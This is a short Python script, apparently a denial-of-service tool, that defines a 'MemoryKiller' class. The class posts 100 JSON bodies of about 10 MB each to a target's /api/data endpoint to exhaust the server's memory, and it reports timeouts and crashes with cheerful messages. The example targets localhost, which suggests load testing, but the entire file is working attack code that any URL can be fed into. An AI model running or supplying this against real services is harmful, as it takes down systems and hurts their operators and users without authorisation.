import requests
import json

class MemoryKiller:
    def __init__(self, target_url):
        self.target_url = target_url
    
    def send_memory_hog_requests(self):
        """Send requests with massive payloads to exhaust memory"""
        print("💾 Sending memory-exhausting payloads...")
        
        # Create massive JSON payload
        massive_data = {
            "huge_array": ["x" * 1000] * 10000,  # 10MB per request
            "nested_data": {"level1": {"level2": {"level3": "x" * 5000}}}
        }
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Memory-Killer'
        }
        
        for i in range(100):  # Send 100 massive requests
            try:
                response = requests.post(
                    f"{self.target_url}/api/data",  # Change to your API endpoint
                    data=json.dumps(massive_data),
                    headers=headers,
                    timeout=10
                )
                print(f"📦 Sent massive payload {i+1}, Status: {response.status_code}")
            except requests.exceptions.Timeout:
                print("⏰ Server timed out - it's struggling!")
            except requests.exceptions.ConnectionError:
                print("🔌 Connection refused - SERVER CRASHED!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

# Usage
killer = MemoryKiller('http://localhost:3000')
killer.send_memory_hog_requests()